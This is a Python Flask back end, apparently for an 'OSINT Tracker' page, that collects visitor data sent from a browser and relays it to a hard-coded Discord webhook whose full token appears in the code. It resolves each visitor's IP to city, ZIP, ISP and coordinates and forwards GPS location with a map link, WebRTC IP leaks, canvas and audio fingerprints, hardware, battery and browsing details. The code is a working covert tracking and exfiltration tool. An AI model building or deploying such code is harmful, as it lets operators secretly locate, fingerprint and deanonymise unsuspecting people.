from flask import Flask, request, jsonify, send_file
import json
import datetime
import requests

app = Flask(__name__)

# Your Discord webhook URL
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1536189236431290369/lAIwbt_ESg5gor_CXxkx7WbR8Sjol7lMtg_EeWVYBJaiK8c_8znAEXMPGUxQxrwF5deB"

@app.route('/')
def serve_index():
    return send_file('../static/index.html')

@app.route('/track', methods=['POST'])
def track_data():
    data = request.json
    print("Data received:", json.dumps(data, indent=2))
    
    # Get IP from request
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    
    # Try to get IP intelligence
    ip_info = {}
    try:
        response = requests.get(f'http://ip-api.com/json/{client_ip}', timeout=5)
        if response.status_code == 200:
            ip_data = response.json()
            if ip_data.get('status') == 'success':
                ip_info = {
                    'ip': ip_data.get('query'),
                    'country': ip_data.get('country'),
                    'countryCode': ip_data.get('countryCode'),
                    'region': ip_data.get('regionName'),
                    'city': ip_data.get('city'),
                    'zip': ip_data.get('zip'),
                    'isp': ip_data.get('isp'),
                    'org': ip_data.get('org'),
                    'as': ip_data.get('as'),
                    'timezone': ip_data.get('timezone'),
                    'lat': ip_data.get('lat'),
                    'lon': ip_data.get('lon')
                }
    except Exception as e:
        print(f"IP lookup failed: {e}")
    
    data['ipInfo'] = ip_info
    data['clientIp'] = client_ip
    
    # Send to Discord with enhanced formatting
    send_to_discord(data)
    
    return jsonify({"status": "success", "discord_sent": True})

def send_to_discord(data):
    """Send enhanced data to Discord"""
    
    location = data.get('location', {})
    ip_info = data.get('ipInfo', {})
    screen = data.get('screen', {})
    battery = data.get('battery', {})
    webrtc = data.get('webRTCIPs', [])
    performance = data.get('performance', {})
    hardware = data.get('hardware', {})
    
    # Build the message
    message_lines = []
    message_lines.append("📍 **New Tracking Data Received**")
    message_lines.append("")
    
    # 1. LOCATION
    if location and location.get('latitude'):
        lat = location.get('latitude')
        lng = location.get('longitude')
        accuracy = location.get('accuracy', 'N/A')
        message_lines.append(f"**📍 Location**")
        message_lines.append(f"Latitude: {lat}")
        message_lines.append(f"Longitude: {lng}")
        message_lines.append(f"Accuracy: ±{accuracy}m")
        message_lines.append(f"Google Maps: https://maps.google.com/?q={lat},{lng}")
        message_lines.append("")
    else:
        error = location.get('error', 'Not shared')
        message_lines.append(f"**📍 Location**")
        message_lines.append(f"❌ Location not shared")
        message_lines.append(f"Reason: {error}")
        message_lines.append("")
    
    # 2. IP INFO (NEW)
    if ip_info:
        message_lines.append("**🌐 IP Intelligence**")
        if ip_info.get('ip'): message_lines.append(f"IP: `{ip_info.get('ip')}`")
        if ip_info.get('country'): message_lines.append(f"Country: {ip_info.get('country')}")
        if ip_info.get('city'): message_lines.append(f"City: {ip_info.get('city')}")
        if ip_info.get('region'): message_lines.append(f"Region: {ip_info.get('region')}")
        if ip_info.get('zip'): message_lines.append(f"ZIP: {ip_info.get('zip')}")
        if ip_info.get('isp'): message_lines.append(f"ISP: {ip_info.get('isp')}")
        if ip_info.get('org'): message_lines.append(f"Organization: {ip_info.get('org')}")
        if ip_info.get('as'): message_lines.append(f"ASN: {ip_info.get('as')}")
        if ip_info.get('timezone'): message_lines.append(f"Timezone: {ip_info.get('timezone')}")
        message_lines.append("")
    
    # 3. BROWSER INFO
    message_lines.append("**🖥️ Browser Info**")
    message_lines.append(f"User Agent: {data.get('userAgent', 'N/A')[:150]}")
    message_lines.append(f"Platform: {data.get('platform', 'N/A')}")
    message_lines.append(f"Language: {data.get('language', 'N/A')}")
    message_lines.append(f"Languages: {', '.join(data.get('languages', []))}")
    message_lines.append(f"Cookie Enabled: {data.get('cookieEnabled', 'N/A')}")
    message_lines.append(f"Do Not Track: {data.get('doNotTrack', 'N/A')}")
    message_lines.append("")
    
    # 4. SCREEN
    message_lines.append("**📺 Screen**")
    message_lines.append(f"Resolution: {screen.get('width', 'N/A')}x{screen.get('height', 'N/A')}")
    message_lines.append(f"Available: {screen.get('availWidth', 'N/A')}x{screen.get('availHeight', 'N/A')}")
    message_lines.append(f"Color Depth: {screen.get('colorDepth', 'N/A')}")
    message_lines.append(f"Pixel Ratio: {screen.get('pixelRatio', 'N/A')}")
    message_lines.append("")
    
    # 5. HARDWARE (NEW - More details)
    message_lines.append("**💻 Hardware**")
    message_lines.append(f"CPU Cores: {hardware.get('hardwareConcurrency', 'N/A')}")
    message_lines.append(f"RAM: {hardware.get('deviceMemory', 'N/A')}GB")
    message_lines.append(f"Touch Points: {hardware.get('maxTouchPoints', 'N/A')}")
    message_lines.append(f"Platform: {hardware.get('platform', 'N/A')}")
    message_lines.append(f"Vendor: {hardware.get('vendor', 'N/A')}")
    message_lines.append("")
    
    # 6. WEBRTC LEAK
    if webrtc and webrtc[0] not in ['No local IPs found', 'WebRTC not supported']:
        message_lines.append("**🔓 WebRTC IP Leak**")
        message_lines.append(f"```{', '.join(webrtc)}```")
        message_lines.append("")
    
    # 7. FINGERPRINTS
    message_lines.append("**🆔 Fingerprints**")
    message_lines.append(f"Canvas: `{data.get('canvasFingerprint', 'N/A')}`")
    message_lines.append(f"Audio: `{data.get('audioFingerprint', 'N/A')}`")
    message_lines.append("")
    
    # 8. BATTERY
    if battery:
        message_lines.append("**🔋 Battery**")
        message_lines.append(f"Level: {battery.get('level', 'N/A')}")
        message_lines.append(f"Charging: {battery.get('charging', 'N/A')}")
        if battery.get('chargingTime') is not None and battery.get('chargingTime') != 'Infinity':
            message_lines.append(f"Charging Time: {battery.get('chargingTime')}s")
        if battery.get('dischargingTime') is not None and battery.get('dischargingTime') != 'Infinity':
            message_lines.append(f"Discharging Time: {battery.get('dischargingTime')}s")
        message_lines.append("")
    
    # 9. PERFORMANCE (NEW)
    if performance:
        message_lines.append("**⚡ Performance**")
        if performance.get('loadTime') != 'N/A':
            message_lines.append(f"Load Time: {performance.get('loadTime')}ms")
        if performance.get('domReady') != 'N/A':
            message_lines.append(f"DOM Ready: {performance.get('domReady')}ms")
        if performance.get('dns') != 'N/A':
            message_lines.append(f"DNS Lookup: {performance.get('dns')}ms")
        if performance.get('tcp') != 'N/A':
            message_lines.append(f"TCP Connect: {performance.get('tcp')}ms")
        if performance.get('ttfb') != 'N/A':
            message_lines.append(f"TTFB: {performance.get('ttfb')}ms")
        message_lines.append("")
    
    # 10. TIMEZONE & BEHAVIORAL
    message_lines.append("**🧠 Behavioral**")
    message_lines.append(f"Timezone: {data.get('timezone', 'N/A')}")
    message_lines.append(f"Timezone Offset: {data.get('timezoneOffset', 'N/A')} minutes")
    message_lines.append(f"Referrer: {data.get('referrer', 'Direct')}")
    message_lines.append(f"URL: {data.get('url', 'N/A')}")
    message_lines.append(f"History Depth: {data.get('historyDepth', 'N/A')}")
    message_lines.append("")
    
    # 11. SESSION
    message_lines.append("**🆔 Session**")
    message_lines.append(f"Session ID: {data.get('sessionId', 'N/A')}")
    message_lines.append(f"Timestamp: {data.get('timestamp', 'N/A')}")
    
    # Send to Discord
    payload = {
        "content": "\n".join(message_lines),
        "username": "OSINT Tracker"
    }
    
    try:
        response = requests.post(DISCORD_WEBHOOK, json=payload, timeout=10)
        print(f"Discord status: {response.status_code}")
        if response.status_code != 204:
            print(f"Discord error: {response.text}")
    except Exception as e:
        print(f"Error sending to Discord: {e}")

app = app
